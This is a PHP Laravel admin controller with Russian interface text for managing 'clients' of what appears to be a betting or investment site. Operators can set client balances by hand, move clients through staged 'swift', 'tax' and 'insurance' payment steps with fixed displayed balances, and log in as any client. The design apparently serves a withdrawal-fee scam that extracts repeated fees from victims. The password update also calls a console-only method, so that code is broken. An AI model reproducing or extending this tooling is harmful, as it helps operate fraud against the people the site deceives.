<?php

namespace App\Http\Controllers\Backend;

use App\Models\Client;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;

class ClientController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index(Request $request)
    {
        $clients = Client::orderBy('created_at', 'desc')->with(['partner', 'bets', 'refills', 'payments']);

        $partners = ['' => 'Выберите из списка'];

        foreach (\App\Models\User::orderBy('name', 'asc')->get() as $partner) {
            $partners[$partner->id] = $partner->name . ' [ ID: ' . $partner->id . ']';
        }

        $filter = [
            'id' => $request->input('filter.id'),
            'client_id' => $request->input('filter.client_id'),
            'partner_id' => $request->input('filter.partner_id'),
            'bets_count' => $request->input('filter.bets_count'),
        ];

        if ($filter['id']) {
            $clients->where('id', $filter['id']);
        }

        if ($filter['bets_count']) {
            $clients->where('bets_count', $filter['bets_count']);
        }

        if ($filter['client_id']) {
            $clients->where('id', $filter['client_id']);
        }

        if ($filter['partner_id']) {
            $clients->where('partner_id', $filter['partner_id']);
        }

        $filter_clients = ['Выберите из списка'];
        foreach (Client::orderby('email', 'asc')->get() as $client) {
            $filter_clients[$client->id] = '[ ID: ' . $client->id . ' ] ' . $client->name . ' ( ' . $client->email . ' )';
        }

        $pager = $clients->paginate();

        return view('backend.clients.index', ['pager' => $pager, 'filter' => $filter, 'partners' => $partners, 'filter_clients' => $filter_clients]);
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        $model = Client::findOrFail($id);

        $partners = [];
        foreach (User::all() as $partner) {
            $partners[$partner->id] = '[ ID: ' . $partner->id . ' ] ' . $partner->email;
        }

        return view('backend.clients.form', ['model' => $model, 'partners' => $partners]);
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request $request
     * @param  int $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        $this->validate($request, [
            'name' => 'required',
            'email' => 'required|email',
        ]);

        $model = Client::findOrFail($id);
        $model->name = $request->get('name');
        $model->email = $request->get('email');
        $model->balance = $request->get('balance');
        $model->freezed_amount = $request->get('freezed_amount');
        $model->bets_count = $request->get('bets_count');
        $model->swift_count = $request->get('swift_count');
        $model->tax_count = $request->get('tax_count');
        $model->status = $request->get('status');
        $model->is_tax_payed = $request->get('is_tax_payed') ? true : false;
        $model->is_swift_payed = $request->get('is_swift_payed') ? true : false;
        $model->is_show_status_menu = $request->get('is_show_status_menu') ? true : false;
        $model->is_status_deposit_created = $request->get('is_status_deposit_created') ? true : false;

        if($request->get('show_account_activation') == true){
            $model->step = null;
        }

        if($request->get('show_form_first') == true){
            $model->step = 'account_activation';
        }

        if($request->get('show_swift_first') == true){
            $model->step = 'swift_first';
        }

        if($request->get('show_tax_first') == true){
            $model->step = 'tax_first';
        }

        if($request->get('show_tax_first_wait') == true){
            $model->step = 'tax_first_wait';
        }

        if($request->get('show_status') == true){
            $model->step = 'status';
        }

        if($request->get('show_deposit') == true){
            $model->step = 'pre_swift_second';
            $model->temp_balance = 190;
        }

        if($request->get('show_form_second') == true){
            $model->step = 'pre_swift_second';
            $model->temp_balance = 200;
        }

        if($request->get('show_swift_second') == true){
            $model->step = 'swift_second';
            $model->temp_balance = 200;
        }

        if($request->get('show_tax_second') == true){
            $model->step = 'tax_second';
            $model->temp_balance = 200;
        }

        if($request->get('show_insurance') == true){
            $model->step = 'insurance';
            $model->temp_balance = 265;
        }

        if($request->get('show_complete') == true){
            $model->step = 'complete';
        }

        if ($request->get('password') && $request->get('password') == $request->get('password_confirmation')) {
            $model->password = \Hash::make($this->argument('password'));
        }
        if (!$request->get('is_show_status_menu')) {
            $model->status = false;
        }
        $model->save();

        session()->flash('success', 'Информация обновлена');

        return redirect()->route('backend.clients.index');
    }

    public function auth($id)
    {
        $model = Client::findOrFail($id);

        auth('client')->login($model);

        return redirect('/');
    }

}
